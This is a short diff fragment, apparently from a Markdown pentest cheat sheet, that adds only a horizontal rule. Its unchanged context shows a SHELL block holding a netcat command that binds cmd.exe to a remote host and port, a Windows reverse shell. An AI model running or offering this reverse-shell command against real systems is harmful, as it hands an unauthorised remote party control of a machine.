@@ -189,3 +189,6 @@ go
 ```SHELL
 nc.exe -e cmd.exe <targetip> <targetport>
 ```
+
+---
+
